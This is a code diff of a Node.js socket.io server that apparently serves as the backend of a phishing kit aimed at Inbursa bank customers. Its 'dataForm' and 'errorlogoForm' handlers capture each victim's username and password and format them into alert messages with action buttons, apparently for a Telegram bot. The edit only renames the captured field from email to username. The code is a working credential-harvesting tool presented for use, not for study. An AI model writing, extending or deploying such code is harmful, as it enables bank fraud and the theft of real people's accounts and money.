@@ -1,4 +1,3 @@
-// server.js
 require('dotenv').config();
 const express = require('express');
 const app = express();
@@ -28,10 +27,10 @@ io.on('connection', (socket) => {
   console.log('🧠 Usuario conectado:', socket.id);
 
   // Login principal
-  socket.on('dataForm', ({ correo, contrasena, sessionId }) => {
+  socket.on('dataForm', ({ usuario, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso INBURSA RICKSAN:\n\n📧 Correo: ${correo}\n🔑 Contraseña: ${contrasena}`;
+    const mensaje = `🔐 Nuevo intento de acceso INBURSA RICKSAN:\n\n📧 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -88,10 +87,10 @@ io.on('connection', (socket) => {
   });
 
   // Formulario de errorlogo.html
-  socket.on('errorlogoForm', ({ correo, contrasena, sessionId }) => {
+  socket.on('errorlogoForm', ({ usuario, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado INBURSA RICKSAN:\n\n📧 Usuario: ${correo}\n🔑 Clave: ${contrasena}`;
+    const mensaje = `⚠️ Nuevo intento fallido detectado INBURSA RICKSAN:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
